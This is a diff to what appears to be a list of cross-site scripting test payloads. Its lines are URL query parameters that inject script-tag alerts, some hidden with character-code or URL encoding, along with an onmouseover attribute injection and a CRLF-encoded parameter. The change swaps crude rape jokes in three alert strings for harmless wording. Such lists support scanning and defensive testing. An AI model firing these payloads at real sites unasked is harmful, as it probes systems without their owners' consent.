@@ -62,9 +62,9 @@
 &storeId=10701%3Cscript%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/script%3E&catalogId=10051
 &list="><script>alert(String.fromCharCode(88,83,83))</script>
 &collection=81"><script>alert(String.fromCharCode(88,83,83))</script>
-&foo=<SCrIPT>alert("PLEASE RAPE MY FACE")</SCrIPT>
-&foo=<SCrIPT>alert("I BEESEECH THEE, RAPETH MINE VISAGE")</SCrIPT>
-&id=1&cat=<script>alert('pleaserapemyface')</script>
+&foo=<SCrIPT>alert("PLEASE PHOTO MY FACE")</SCrIPT>
+&foo=<SCrIPT>alert("I BEESEECH THEE, PHOTOETH MINE VISAGE")</SCrIPT>
+&id=1&cat=<script>alert('pleasephotomyface')</script>
 &name=Search&action=search&overview=1&bool=AND&active_polling%0D%0Aweblinks=1&active_address_book=1&active_consultation=1&active_forum=1&active_requirements=1&active_calendar=1&active_guestbook=1&active_questionnaire=1&active_seminar=1&active_stories=1&active_downloads=1&active_users=1&active_subjects=1&q=1%22+onmouseover=alert%28String.fromCharCode%2872,101,108,108,111,32,87,111,114,108,100,33%29%29+&search=&search_area=all
 &q="><script>alert(String.fromCharCode(88,83,83))</script>
 &s="><script>alert(String.fromCharCode(88,83,83))</script>
